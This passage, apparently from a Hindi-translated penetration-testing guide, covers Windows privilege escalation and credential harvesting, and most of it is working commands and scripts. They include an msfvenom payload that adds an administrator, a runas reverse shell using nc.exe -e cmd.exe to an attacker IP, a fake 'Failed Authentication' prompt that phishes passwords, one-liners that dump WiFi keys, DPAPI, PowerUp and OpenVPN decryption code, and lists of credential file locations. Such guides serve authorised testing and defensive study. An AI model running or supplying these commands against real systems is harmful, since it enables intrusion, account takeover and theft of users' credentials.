wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस कमजोरियों का पता लगा सकते हैं और इसका लाभ उठा सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअल रूप से एक सेवा बाइनरी बना सकते हैं metasploit के साथ:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई सेवा विफल होती है तो क्या कार्रवाई की जानी चाहिए। इस सुविधा को एक बाइनरी की ओर इंगित करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह बाइनरी प्रतिस्थापनीय है, तो विशेषाधिकार वृद्धि संभव हो सकती है। अधिक विवरण [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में पाया जा सकता है।

## Applications

### Installed Applications

**बाइनरी के अनुमतियों** की जांच करें (शायद आप एक को अधिलेखित कर सकते हैं और विशेषाधिकार बढ़ा सकते हैं) और **फोल्डरों** के ([DLL Hijacking](dll-hijacking/index.html))।
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

जांचें कि क्या आप किसी कॉन्फ़िगरेशन फ़ाइल को संशोधित कर सकते हैं ताकि किसी विशेष फ़ाइल को पढ़ सकें या यदि आप किसी बाइनरी को संशोधित कर सकते हैं जो एक व्यवस्थापक खाते (schedtasks) द्वारा निष्पादित होने वाली है।

सिस्टम में कमजोर फ़ोल्डर/फ़ाइल अनुमतियों को खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जांचें कि क्या आप कुछ रजिस्ट्री या बाइनरी को ओवरराइट कर सकते हैं जो किसी अन्य उपयोगकर्ता द्वारा निष्पादित होने वाली है।**\
**अधिक जानने के लिए** **निम्नलिखित पृष्ठ** को पढ़ें **प्रिविलेज बढ़ाने के लिए दिलचस्प ऑटोरन स्थानों** के बारे में:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ड्राइवर

संभावित **तीसरे पक्ष के अजीब/कमजोर** ड्राइवरों की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

यदि आपके पास **PATH पर मौजूद एक फ़ोल्डर के अंदर लिखने की अनुमति है** तो आप एक प्रक्रिया द्वारा लोड की गई DLL को हाईजैक करने और **अधिकार बढ़ाने** में सक्षम हो सकते हैं।

PATH के अंदर सभी फ़ोल्डरों की अनुमतियों की जांच करें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस जांच का दुरुपयोग कैसे करें, इसके बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts फ़ाइल पर हार्डकोडेड अन्य ज्ञात कंप्यूटरों की जांच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहर से **प्रतिबंधित सेवाओं** की जांच करें
```bash
netstat -ano #Opened ports?
```
### राउटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित कमांड के लिए इस पृष्ठ की जांच करें**](../basic-cmd-for-pentesters.md#firewall) **(नियमों की सूची, नियम बनाना, बंद करना, बंद करना...)**

अधिक [नेटवर्क एन्यूमरेशन के लिए कमांड यहाँ](../basic-cmd-for-pentesters.md#network)

### विंडोज सबसिस्टम फॉर लिनक्स (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` भी `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में पाया जा सकता है।

यदि आप रूट उपयोगकर्ता प्राप्त करते हैं, तो आप किसी भी पोर्ट पर सुन सकते हैं (जब आप पहली बार `nc.exe` का उपयोग करके किसी पोर्ट पर सुनते हैं, तो यह GUI के माध्यम से पूछेगा कि क्या `nc` को फ़ायरवॉल द्वारा अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
बश को रूट के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आजमा सकते हैं।

आप `WSL` फ़ाइल सिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में खोज सकते हैं।

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault उपयोगकर्ता क्रेडेंशियल्स को सर्वरों, वेबसाइटों और अन्य कार्यक्रमों के लिए संग्रहीत करता है जिनमें **Windows** उपयोगकर्ताओं को **स्वचालित रूप से लॉग इन कर सकता है**। पहले दृष्टिकोण में, यह ऐसा लग सकता है कि अब उपयोगकर्ता अपने फेसबुक क्रेडेंशियल्स, ट्विटर क्रेडेंशियल्स, जीमेल क्रेडेंशियल्स आदि को संग्रहीत कर सकते हैं, ताकि वे स्वचालित रूप से ब्राउज़रों के माध्यम से लॉग इन कर सकें। लेकिन ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को संग्रहीत करता है जिनसे Windows उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है, जिसका अर्थ है कि कोई भी **Windows एप्लिकेशन जिसे किसी संसाधन (सर्वर या वेबसाइट) तक पहुँचने के लिए क्रेडेंशियल्स की आवश्यकता होती है** **इस Credential Manager** और Windows Vault का उपयोग कर सकता है और उपयोगकर्ताओं द्वारा बार-बार उपयोगकर्ता नाम और पासवर्ड दर्ज करने के बजाय प्रदान किए गए क्रेडेंशियल्स का उपयोग कर सकता है।

जब तक एप्लिकेशन Credential Manager के साथ इंटरैक्ट नहीं करते, मुझे नहीं लगता कि उनके लिए किसी दिए गए संसाधन के लिए क्रेडेंशियल्स का उपयोग करना संभव है। इसलिए, यदि आपका एप्लिकेशन वॉल्ट का उपयोग करना चाहता है, तो इसे किसी न किसी तरह से **क्रेडेंशियल मैनेजर के साथ संवाद करना चाहिए और उस संसाधन के लिए क्रेडेंशियल्स को डिफ़ॉल्ट स्टोरेज वॉल्ट से अनुरोध करना चाहिए**।

मशीन पर संग्रहीत क्रेडेंशियल्स की सूची बनाने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप `/savecred` विकल्पों के साथ `runas` का उपयोग कर सकते हैं ताकि सहेजे गए क्रेडेंशियल्स का उपयोग किया जा सके। निम्नलिखित उदाहरण एक SMB शेयर के माध्यम से एक दूरस्थ बाइनरी को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` के साथ प्रदान किए गए क्रेडेंशियल का उपयोग करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

**डेटा प्रोटेक्शन एपीआई (DPAPI)** डेटा के सममित एन्क्रिप्शन के लिए एक विधि प्रदान करता है, जो मुख्य रूप से विंडोज ऑपरेटिंग सिस्टम के भीतर असममित निजी कुंजियों के सममित एन्क्रिप्शन के लिए उपयोग किया जाता है। यह एन्क्रिप्शन एक उपयोगकर्ता या सिस्टम रहस्य का उपयोग करता है ताकि एंट्रॉपी में महत्वपूर्ण योगदान दिया जा सके।

**DPAPI उपयोगकर्ता के लॉगिन रहस्यों से निकाली गई सममित कुंजी के माध्यम से कुंजियों के एन्क्रिप्शन को सक्षम बनाता है**। सिस्टम एन्क्रिप्शन के मामलों में, यह सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्टेड उपयोगकर्ता RSA कुंजियाँ `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका में संग्रहीत होती हैं, जहाँ `{SID}` उपयोगकर्ता के [सुरक्षा पहचानकर्ता](https://en.wikipedia.org/wiki/Security_Identifier) का प्रतिनिधित्व करता है। **DPAPI कुंजी, जो उपयोगकर्ता की निजी कुंजियों की सुरक्षा करने वाली मास्टर कुंजी के साथ उसी फ़ाइल में स्थित होती है**, आमतौर पर 64 बाइट्स के यादृच्छिक डेटा से बनी होती है। (यह ध्यान रखना महत्वपूर्ण है कि इस निर्देशिका तक पहुँच प्रतिबंधित है, जिससे `dir` कमांड के माध्यम से इसकी सामग्री को सूचीबद्ध करने से रोका जाता है, हालाँकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप **mimikatz module** `dpapi::masterkey` का उपयोग उचित तर्कों (`/pvk` या `/rpc`) के साथ इसे डिक्रिप्ट करने के लिए कर सकते हैं।

**मास्टर पासवर्ड द्वारा सुरक्षित क्रेडेंशियल फ़ाइलें** आमतौर पर निम्न स्थान पर स्थित होती हैं:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप **mimikatz module** `dpapi::cred` का उपयोग उचित `/masterkey` के साथ डिक्रिप्ट करने के लिए कर सकते हैं।\
आप `sekurlsa::dpapi` module के साथ **memory** से **many DPAPI** **masterkeys** निकाल सकते हैं (यदि आप root हैं)।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** अक्सर **scripting** और स्वचालन कार्यों के लिए एन्क्रिप्टेड क्रेडेंशियल्स को सुविधाजनक तरीके से स्टोर करने के लिए उपयोग किए जाते हैं। क्रेडेंशियल्स को **DPAPI** का उपयोग करके सुरक्षित किया जाता है, जिसका अर्थ है कि इन्हें केवल उसी उपयोगकर्ता द्वारा उसी कंप्यूटर पर डिक्रिप्ट किया जा सकता है जिस पर इन्हें बनाया गया था।

आप फ़ाइल से PS क्रेडेंशियल्स को **decrypt** करने के लिए कर सकते हैं:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाईफाई
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं।

### Recently Run Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz** `dpapi::rdg` मॉड्यूल का उपयोग करें उचित `/masterkey` के साथ **किसी भी .rdg फ़ाइलों को डिक्रिप्ट करने के लिए**\
आप **Mimikatz** `sekurlsa::dpapi` मॉड्यूल के साथ मेमोरी से कई DPAPI मास्टरकीज़ **निकाल सकते हैं**।

### Sticky Notes

लोग अक्सर Windows वर्कस्टेशनों पर StickyNotes ऐप का उपयोग **पासवर्ड** और अन्य जानकारी को **सहेजने** के लिए करते हैं, यह नहीं realizing कि यह एक डेटाबेस फ़ाइल है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित है और इसे खोजने और जांचने के लिए हमेशा मूल्यवान होता है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से पासवर्ड पुनर्प्राप्त करने के लिए आपको Administrator होना चाहिए और उच्च इंटीग्रिटी स्तर के तहत चलाना चाहिए।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` निर्देशिका में स्थित है।\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **क्रेडेंशियल्स** कॉन्फ़िगर किए गए हैं और उन्हें **पुनर्प्राप्त** किया जा सकता है।

यह कोड [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से निकाला गया था:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं।\
इंस्टॉलर **SYSTEM विशेषाधिकारों के साथ चलाए जाते हैं**, कई **DLL Sideloading के प्रति संवेदनशील हैं (जानकारी** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)।**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (क्रेडेंशियल्स)

### Putty क्रेडेंशियल्स
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजी
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH निजी कुंजी रजिस्ट्री कुंजी `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत की जा सकती हैं, इसलिए आपको यह जांचना चाहिए कि क्या वहाँ कुछ दिलचस्प है:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आप उस पथ के अंदर कोई प्रविष्टि पाते हैं, तो यह संभवतः एक सहेजा गया SSH कुंजी होगी। इसे एन्क्रिप्टेड रूप में संग्रहीत किया गया है लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके डिक्रिप्ट किया जा सकता है।\
इस तकनीक के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` सेवा चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वचालित रूप से शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!NOTE]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh कुंजी बनाने की कोशिश की, उन्हें `ssh-add` के साथ जोड़ने और ssh के माध्यम से एक मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने विषम कुंजी प्रमाणीकरण के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** नामक फ़ाइल के लिए खोजें

### Cached GPP Pasword

एक विशेषता पहले उपलब्ध थी जिसने Group Policy Preferences (GPP) के माध्यम से मशीनों के एक समूह पर कस्टम स्थानीय व्यवस्थापक खातों को तैनात करने की अनुमति दी। हालाँकि, इस विधि में महत्वपूर्ण सुरक्षा खामियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी डोमेन उपयोगकर्ता द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के भीतर पासवर्ड, जो एक सार्वजनिक रूप से प्रलेखित डिफ़ॉल्ट कुंजी का उपयोग करके AES256 के साथ एन्क्रिप्ट किए गए थे, किसी भी प्रमाणित उपयोगकर्ता द्वारा डिक्रिप्ट किए जा सकते थे। यह एक गंभीर जोखिम प्रस्तुत करता था, क्योंकि इससे उपयोगकर्ताओं को उच्चाधिकार प्राप्त करने की अनुमति मिल सकती थी।

इस जोखिम को कम करने के लिए, एक फ़ंक्शन विकसित किया गया था जो "cpassword" फ़ील्ड वाले स्थानीय रूप से कैश किए गए GPP फ़ाइलों को स्कैन करता है जो खाली नहीं है। ऐसी फ़ाइल मिलने पर, फ़ंक्शन पासवर्ड को डिक्रिप्ट करता है और एक कस्टम PowerShell ऑब्जेक्ट लौटाता है। यह ऑब्जेक्ट GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जो इस सुरक्षा भेद्यता की पहचान और सुधार में मदद करता है।

इन फ़ाइलों के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके पासवर्ड प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
वेब.config का उदाहरण जिसमें क्रेडेंशियल्स हैं:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### क्रेडेंशियल्स के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके क्रेडेंशियल्स या किसी अन्य उपयोगकर्ता के क्रेडेंशियल्स दर्ज करने के लिए कह सकते हैं** यदि आपको लगता है कि वह उन्हें जानता होगा (ध्यान दें कि **ग्राहक से सीधे **क्रेडेंशियल्स** के लिए पूछना वास्तव में **खतरनाक** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जिनमें क्रेडेंशियल्स हो सकते हैं**

जाने-माने फ़ाइलें जो कुछ समय पहले **क्लियर-टेक्स्ट** या **Base64** में **पासवर्ड** रखती थीं
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
